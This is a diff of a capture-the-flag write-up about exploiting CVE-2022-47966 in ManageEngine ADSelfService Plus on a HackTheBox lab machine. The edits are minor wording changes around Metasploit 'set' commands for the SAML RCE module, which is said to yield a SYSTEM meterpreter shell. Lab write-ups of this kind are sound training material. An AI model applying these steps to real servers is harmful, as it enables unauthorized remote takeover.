@@ -461,7 +461,7 @@ One thing I've learnt with the newer HTB machines is that **they always use newe
 
 {% embed url="https://www.cvedetails.com/vulnerability-list/vendor_id-9841/product_id-20523/Zohocorp-Manageengine-Adselfservice-Plus.html" %}
 
-The first was CVE-2022-47966, which was an Exec Code exploit. It seems to affect a huge number of versions, so it might work. This particular exploit requires SAML SSO to be enabled, and it is on this website. The following link is visited when we first load the page before logging in
+The first was CVE-2022-47966, which was an Exec Code exploit. It seems to affect a huge number of versions, so it might work. This particular exploit requires SAML SSO to be enabled, and it is on this website. The following link is visited when we first load the page before logging in:
 
 {% code overflow="wrap" %}
 ```
@@ -473,7 +473,7 @@ I took a hint from the HTB forum, and it seems `metasploit` is the easiest way t
 
 {% embed url="https://github.com/rapid7/metasploit-framework/pull/17527" %}
 
-Either that or we can update `metasploit` and access the module via `use exploit/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966`. Looking at the options, the main ones to set are **GUID and ISSUER\_URL.**
+Either that or we can update `metasploit` and access the module via `use exploit/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966`. Looking at the options, the main ones to set are **GUID and ISSUER\_URL.** The GUID must be the string we got after logging in. Based on the definition of the issuer URL, we can find it quite easily by googling SAML SSO identity provider. We can set the options below:
 
 ```
 set RHOSTS 172.16.22.1
@@ -483,8 +483,6 @@ set RPORT 9251
 set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
 set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
 ```
-
-The last one was a struggle, because we have to find the identity provider for the target server. Quick googling reveals it however.
 
 When executed, we would get a meterpreter shell as the SYSTEM user.
 
